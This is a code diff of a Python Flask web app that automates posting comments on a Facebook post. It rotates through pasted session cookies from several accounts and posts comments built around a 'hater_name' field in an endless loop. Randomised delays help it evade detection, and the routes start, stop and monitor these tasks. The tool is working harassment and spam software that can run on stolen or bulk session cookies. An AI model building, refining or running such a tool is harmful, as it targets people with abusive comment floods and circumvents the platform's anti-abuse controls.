@@ -3,7 +3,6 @@ import requests
 import os
 import re
 import time
-import sys
 import threading
 import random
 import string
@@ -25,7 +24,7 @@ class FacebookCommenter:
         self.start_time = datetime.now()
         self.is_running = True
         self.last_status = "Initializing"
-        self.comment_loop = True  # For infinite commenting
+        self.comment_loop = True
         
     def stop_task(self):
         self.is_running = False
@@ -42,30 +41,26 @@ class FacebookCommenter:
     def extract_post_id(self, url):
         """Extract post ID from various Facebook URL formats"""
         try:
-            parsed = urlparse(url)
-            
-            # Handle standard post URLs
+            # Standard post URL pattern
             if "/posts/" in url:
-                path_parts = parsed.path.split('/')
-                post_index = path_parts.index("posts") + 1
-                return path_parts[post_index].split('?')[0]
+                return re.search(r'/posts/([^/?]+)', url).group(1)
             
-            # Handle photo/video posts
+            # Photo/video post pattern
             elif "/photos/" in url or "/videos/" in url:
-                return parse_qs(parsed.query).get('fbid', [None])[0]
+                return re.search(r'fbid=([0-9]+)', url).group(1)
             
-            # Handle permalink/story URLs
+            # Permalink/story pattern
             elif "/permalink.php" in url or "/story.php" in url:
-                return parse_qs(parsed.query).get('story_fbid', [None])[0]
+                return re.search(r'story_fbid=([0-9]+)', url).group(1)
             
-            # Fallback - try to get last numeric part
-            last_part = parsed.path.split('/')[-1]
-            if last_part.isdigit():
-                return last_part
+            # Fallback - numeric post ID
+            match = re.search(r'/([0-9]+)/?$', url)
+            if match:
+                return match.group(1)
                 
             return None
         except Exception as e:
-            self.last_status = f"URL parsing error: {str(e)}"
+            self.last_status = f"URL Error: {str(e)}"
             return None
 
     def parse_cookies(self, cookie_input):
@@ -84,101 +79,71 @@ class FacebookCommenter:
 
     def verify_cookies(self, cookies):
         """Check if cookies provide valid login"""
-        endpoints = [
-            'https://mbasic.facebook.com/me',
-            'https://www.facebook.com/me'
-        ]
-        
-        for endpoint in endpoints:
-            try:
-                response = requests.get(
-                    endpoint,
-                    cookies={"cookie": cookies},
-                    headers={
-                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
-                    },
-                    timeout=10,
-                    allow_redirects=False
-                )
-                if response.status_code == 200 and 'c_user' in cookies:
-                    return True
-            except:
-                continue
-        return False
-
-    def comment_on_post(self, cookies, post_url, comment, hater_name, last_name):
-        if not self.is_running:
+        try:
+            response = requests.get(
+                'https://mbasic.facebook.com/me',
+                cookies={"cookie": cookies},
+                headers={'User-Agent': 'Mozilla/5.0'},
+                timeout=10,
+                allow_redirects=False
+            )
+            return response.status_code == 200 and 'c_user' in cookies
+        except:
             return False
 
+    def comment_on_post(self, cookies, post_url, comment, hater_name, last_name):
         try:
             post_id = self.extract_post_id(post_url)
             if not post_id:
-                self.last_status = "<Error> Invalid post URL format"
+                self.last_status = "Invalid post URL"
                 return False
 
             parsed_cookies = self.parse_cookies(cookies)
             if not self.verify_cookies(parsed_cookies):
-                self.last_status = "<Error> Invalid cookies - login failed"
+                self.last_status = "Invalid cookies"
                 return False
 
-            with requests.Session() as session:
-                session.cookies.update({"cookie": parsed_cookies})
-                session.headers.update({
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Referer': post_url,
-                    'Origin': 'https://www.facebook.com'
-                })
+            session = requests.Session()
+            session.cookies.update({"cookie": parsed_cookies})
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
+                'Referer': post_url
+            })
 
-                # Try mbasic version first
-                mbasic_url = f'https://mbasic.facebook.com/{post_id}'
-                response = session.get(mbasic_url, allow_redirects=True)
+            # Load post page
+            mbasic_url = f'https://mbasic.facebook.com/{post_id}'
+            response = session.get(mbasic_url)
+            
+            # Find comment form
+            fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
+            jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
+            
+            if not fb_dtsg or not jazoest:
+                self.last_status = "Form fields missing"
+                return False
 
-                # Fallback to www if mbasic fails
-                if 'login' in response.url:
-                    www_url = f'https://www.facebook.com/{post_id}'
-                    response = session.get(www_url, allow_redirects=True)
-                    if 'login' in response.url:
-                        self.last_status = "<Error> Login required"
-                        return False
+            # Submit comment
+            formatted_comment = f"{hater_name} {comment.strip()} {last_name}"
+            response = session.post(
+                'https://mbasic.facebook.com/a/comment.php',
+                data={
+                    'fb_dtsg': fb_dtsg.group(1),
+                    'jazoest': jazoest.group(1),
+                    'comment_text': formatted_comment
+                },
+                headers={'Content-Type': 'application/x-www-form-urlencoded'}
+            )
 
-                # Extract required form parameters
-                fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
-                jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
-                
-                if not fb_dtsg or not jazoest:
-                    self.last_status = "<Error> Could not find required form fields"
-                    return False
-
-                # Prepare comment text
-                formatted_comment = f"{hater_name} {comment.strip()} {last_name}"
-                
-                # Submit comment
-                comment_url = f'https://mbasic.facebook.com/a/comment.php?fs=1&parent_comment_id=0&ft_ent_identifier={post_id}'
-                
-                response = session.post(
-                    comment_url,
-                    data={
-                        'fb_dtsg': fb_dtsg.group(1),
-                        'jazoest': jazoest.group(1),
-                        'comment_text': formatted_comment
-                    },
-                    headers={
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Referer': mbasic_url
-                    }
-                )
-
-                if response.status_code == 200:
-                    self.comment_count += 1
-                    self.last_status = f"Comment posted: {formatted_comment}"
-                    return True
-                else:
-                    self.last_status = f"Comment failed with status {response.status_code}"
-                    return False
+            if response.status_code == 200:
+                self.comment_count += 1
+                self.last_status = f"Posted: {formatted_comment}"
+                return True
+            else:
+                self.last_status = f"Failed ({response.status_code})"
+                return False
 
         except Exception as e:
-            self.last_status = f"<Error> {str(e)}"
+            self.last_status = f"Error: {str(e)}"
             return False
 
     def run_task(self, config):
@@ -199,22 +164,87 @@ class FacebookCommenter:
                 
                 self.comment_on_post(current_cookie, post_url, current_comment, hater_name, last_name)
                 
-                # Rotate through comments and cookies
                 comment_index += 1
                 cookie_index += 1
-                
-                # Random delay to appear more natural
-                time.sleep(delay + random.uniform(-2, 2))
+                time.sleep(max(5, delay + random.uniform(-2, 2)))  # Minimum 5 sec delay
                 
         except Exception as e:
-            self.last_status = f"<Error> {str(e)}"
+            self.last_status = f"Task Error: {str(e)}"
         finally:
             with task_lock:
                 if self.task_id in active_tasks:
                     del active_tasks[self.task_id]
 
-# ... [Keep all the Flask routes from previous version] ...
+@app.route('/')
+def home():
+    return render_template('index.html')
+
+@app.route('/start_task', methods=['POST'])
+def start_task():
+    try:
+        # Get input data
+        cookies = request.form.get('cookies', '').splitlines()
+        comments = request.form.get('comments', '').splitlines()
+        post_url = request.form.get('post_url', '').strip()
+        hater_name = request.form.get('hater_name', '').strip()
+        last_name = request.form.get('last_name', '').strip()
+        delay = int(request.form.get('delay', 10))
+        
+        # Validate
+        if not all([cookies, comments, post_url, hater_name, last_name]):
+            return jsonify({'status': 'error', 'message': 'All fields are required'})
+        
+        # Create task
+        task_id = ''.join(random.choices(string.digits, k=8))
+        config = {
+            'cookies': [c.strip() for c in cookies if c.strip()],
+            'comments': [c.strip() for c in comments if c.strip()],
+            'post_url': post_url,
+            'hater_name': hater_name,
+            'last_name': last_name,
+            'delay': delay
+        }
+        
+        commenter = FacebookCommenter(task_id)
+        thread = threading.Thread(target=commenter.run_task, args=(config,))
+        thread.daemon = True
+        thread.start()
+        
+        with task_lock:
+            active_tasks[task_id] = commenter
+        
+        return jsonify({
+            'status': 'success',
+            'task_id': task_id,
+            'message': f'Task {task_id} started'
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/stop_task/<task_id>', methods=['POST'])
+def stop_task(task_id):
+    with task_lock:
+        if task_id in active_tasks:
+            active_tasks[task_id].stop_task()
+            return jsonify({'status': 'success', 'message': f'Task {task_id} stopped'})
+        return jsonify({'status': 'error', 'message': 'Task not found'})
+
+@app.route('/task_status/<task_id>')
+def task_status(task_id):
+    with task_lock:
+        if task_id in active_tasks:
+            return jsonify({'status': 'success', 'data': active_tasks[task_id].get_status()})
+        return jsonify({'status': 'error', 'message': 'Task not found'})
+
+@app.route('/active_tasks')
+def get_active_tasks():
+    with task_lock:
+        return jsonify({
+            'status': 'success',
+            'data': {task_id: task.get_status() for task_id, task in active_tasks.items()}
+        })
 
 if __name__ == '__main__':
-    os.makedirs('uploads', exist_ok=True)
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
